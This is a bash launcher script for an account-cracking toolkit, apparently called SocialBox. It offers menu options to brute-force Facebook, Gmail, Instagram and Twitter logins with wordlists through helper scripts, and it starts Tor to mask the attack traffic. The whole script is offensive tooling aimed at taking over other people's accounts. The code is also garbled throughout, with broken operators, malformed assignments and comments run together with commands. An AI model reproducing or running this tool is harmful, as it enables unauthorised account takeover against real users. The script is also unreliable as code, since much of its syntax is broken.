#!/bin/bash

#
Colors
white = "\033[1;37m"
grey = "\033[0;37m"
purple = "\033[0;35m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
Purple = "\033[0;35m"
Cyan = "\033[0;36m"
Cafe = "\033[0;33m"
Fiuscha = "\033[0;35m"
blue = "\033[1;34m"
nc = "\e[0m"#
# ROOT PRIVILEGIES
if [
  [$EUID - ne 0]
];
then
echo "$red You don't have Root privilegies, execute the script as root.$nc"
exit 1
fi# Installation
sleep 1
echo "Checking Installation $nc"
bash install.sh
echo "Checking Completed [$green✓$nc] $nc "
sleep 1
clear# Startup
echo "$green"
echo ""
echo "$yellow Select From Menu : $nc"
echo ""
echo "		$Cyan 1 : Brute Force Facebook Account$nc"
echo "		$Cyan 2 : Brute Force Gmail Account$nc"
echo "		$Cyan 3 : Brute Force Instagram Account$nc"
echo "		$Cyan 4 : Brute Force Twitter Account$nc"
echo "		$Cyan 99: Exit$nc"
read - p "Choice >  "
ch############### FACEBOOK##############
if [$ch = 1];
then
echo "			$Cyan Facebook Brute Force$nc"
echo "$green"
read - p "Enter Facebook ID / Email / Username / Number: "
id
read - p "Enter wordlist path : "
wordlist
echo "$nc"
cd facebook || exit
perl fb - brute.pl $id $wordlist
echo " 		[+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
echo "$red"
read - p "Wanna Back To Main Menu [ Y / n ] : "
check
echo "$nc"
if [$check = "Y"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check = "y"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check = "Yes"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check = "yes"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check = "YES"];
    then
cd.. || exit && bash SocialBox.sh
else
  exit 1
fi################ Gemail - Hack################
elif[$ch = 2];
    then
echo "			$Cyan Gmail Brute Force$nc"
cd gemailhack || exit 
python gemailhack.py
echo "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
echo "$red"
read - p "Wanna Back To Main Menu [ Y / n ] : "
check2
echo "$nc"
if [$check2 = "Y"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check2 = "y"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check2 = "Yes"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check2 = "yes"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check2 = "YES"];
    then
cd.. || exit && bash SocialBox.sh
else
  exit 1
fi######################### Instagram BruteForce#########################
elif[$ch = 3];
    then
echo "			$Cyan Instagram Brute Force$nc"
cd instainsane / || exit 
  sleep 0.025
echo "	[+]$red Service Tor Stated $nc[+]"
sleep 0.9
service tor start
  . / instainsane.sh
echo "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
service tor stop
echo "		[+]$red Service Tor Stopped$nc [+]"
echo "$red"
read - p "Wanna Back To Main Menu [ Y / n ] : "
check3
echo "$nc"
if [$check3 = "Y"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check3 = "y"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check3 = "Yes"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check3 = "yes"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check3 = "YES"];
    then
cd.. || exit && bash SocialBox.sh
else
  exit 1
fi############### TweetShell###############
elif[$ch = 4];
    then
echo "			$Cyan Twitter Brute Force$nc"
cd tweetshell /
  sleep 0.025
echo "	[+]$red Service Tor Stated $nc[+]"
sleep 0.9
service tor start
bash tweetshell.sh
echo "               [+]$yellow Brute Force Complete $nc[$green✓$nc] $nc[+]"
service tor stop
echo "		[+]$red Service Tor Stopped$nc [+]"
echo "$red"
read - p "Wanna Back To Main Menu [ Y / n ] : "
check4
echo "$nc"
if [$check4 = "Y"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check4 = "y"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check4 = "Yes"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check4 = "yes"];
    then
cd.. || exit && bash SocialBox.sh
elif[$check4 = "YES"];
    then
cd.. || exit && bash SocialBox.sh
else
  exit 1
fi
elif[$ch == 99];
    then
echo "$red Program Exit ...$nc"
sleep 0.25
exit 1
else
  echo "Not Found 404 , Exit"
exit 1
fi